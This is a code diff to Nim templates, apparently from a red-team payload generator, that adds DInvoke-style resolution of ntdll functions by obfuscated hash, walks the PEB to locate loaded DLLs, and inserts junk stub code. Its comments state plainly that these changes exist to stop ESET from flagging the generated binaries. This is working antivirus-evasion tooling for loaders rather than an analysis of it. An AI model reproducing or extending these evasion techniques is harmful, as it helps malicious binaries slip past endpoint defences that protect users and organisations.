@@ -69,9 +69,30 @@ type
 type
   LdrLoadDll_t* = proc (PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.stdcall.}
 
+
 # toDo: Syscall
-proc RtlGetCurrentPeb*(): pointer 
-  {.discardable, stdcall, dynlib: "ntdll", importc: "RtlGetCurrentPeb".}
+
+when defined(DInvoke):
+
+
+  type
+    RtlGetCurrentPeb_t* = proc (): pointer {.stdcall.}
+    RtlInitUnicodeString_t* = proc(DestinationString: PUNICODE_STRING, SourceString: PCWSTR): VOID {.stdcall.}
+
+  const
+    RtlGetCurrentPeb_HASH * = obf("RtlGetCurrentPeb")
+    RtlInitUnicodeString_HASH * = obf("RtlInitUnicodeString")
+
+  var MyRtlGetCurrentPeb*: RtlGetCurrentPeb_t
+  var MyRtlInitUnicodeString*: RtlInitUnicodeString_t
+  # temporary - to fix later
+  proc RtlGetCurrentPeb*(): pointer 
+    {.discardable, stdcall, dynlib: "ntdll", importc: "RtlGetCurrentPeb".}
+
+else:
+  proc RtlGetCurrentPeb*(): pointer 
+    {.discardable, stdcall, dynlib: "ntdll", importc: "RtlGetCurrentPeb".}
+
 
 #[ This was the older alternative, which was the trigger for ESET to flag the resulting binaries, therefore I replaced that with RtlGetCurrentPeb.
 proc GetPPEB(p: culong): P_PEB {. 
@@ -85,22 +106,32 @@ proc GetPPEB(p: culong): P_PEB {.
 """
 
 let DInvokeGetPEB * = fmt"""
-import random
-proc calcRand *(): int =
+
+proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE
+proc get_function_address*(hLibrary: HMODULE; fhash: cstring; ordinal: int, specialCase: BOOL): PVOID
+const
+  NTDLL_DLL* = obf("ntdll.dll")
+
+proc calcSomething *(): int =
   var rand: int = 0
   for i in 0 .. 10:
-    rand += rand(0..100)
+    rand += 15
     if ((rand mod 9) != 0):
-      rand += rand(0..100)
+      rand += 15
   return rand
 
+
 proc GetPPEB * (p: culong): P_PEB = 
-  randomize()
   # We need to put any stuff before and after this function, to avoid an ESET detection. It flags any Nim binary that uses this function alone.
   {getRandStubInFunc()}
-  discard calcRand()
-  return cast[P_PEB](RtlGetCurrentPeb())
-  discard calcRand()
+  discard calcSomething()
+  when defined(DInvoke):
+    #MyRtlGetCurrentPeb = cast[RtlGetCurrentPeb_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, TRUE)), RtlGetCurrentPeb_HASH, 0, FALSE)))
+    #return cast[P_PEB](MyRtlGetCurrentPeb())
+    return cast[P_PEB](RtlGetCurrentPeb())
+  else:
+    return cast[P_PEB](RtlGetCurrentPeb())
+  discard calcSomething()
   {getRandStubInFunc()}
 
 """
@@ -120,8 +151,6 @@ const
   LdrLoadDll_SW2_HASH * = obf("LdrLoadDll")
   MZ* = 0x5A4D
 
-const
-  NTDLL_DLL* = obf("ntdll.dll")
 
 {getRandStub()}
 
@@ -138,8 +167,6 @@ proc `-`[T](a: ptr T, b: int): ptr T =
 
 
 proc is_dll*(hLibrary: PVOID): BOOL
-proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE
-proc get_function_address*(hLibrary: HMODULE; fhash: cstring; ordinal: int, specialCase: BOOL): PVOID
 proc find_legacy_export*(hOriginalLibrary: HMODULE; fhash: cstring): PVOID
 
 {getRandStub()}
@@ -185,6 +212,7 @@ proc is_dll*(hLibrary: PVOID): BOOL =
 proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE =
   when defined(verbose):
       echo "\r\n[*] Parsing the PEB to search for the target DLL\r\n"
+      echo "[*] Searching for: ", LibName
   var Peb: PPEB = GetPPEB(PEB_OFFSET)
   var Ldr = Peb.Ldr
   var FirstEntry: PVOID = addr(Ldr.InMemoryOrderModuleList.Flink)
@@ -217,9 +245,13 @@ proc get_library_address*(LibName: LPWSTR; DoLoad: BOOL): HANDLE =
 """
 
 let DInvokeStubThird * = """
+  when defined(DInvoke):
+    var MyRtlInitUnicodeString: RtlInitUnicodeString_t = cast[RtlInitUnicodeString_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(NTDLL_DLL, FALSE)), RtlInitUnicodeString_HASH, 0, TRUE)))
+    MyRtlInitUnicodeString(addr(ModuleFileName), LibName)
+  else:
+    RtlInitUnicodeString(addr(ModuleFileName), LibName)
 
-
-  RtlInitUnicodeString(&ModuleFileName, LibName)
+  #RtlInitUnicodeString(&ModuleFileName, LibName)
   #echo fmt"Copyied {LibName} into {ModuleFileName} "
   #echo "Error after:", $GetLastError()
   
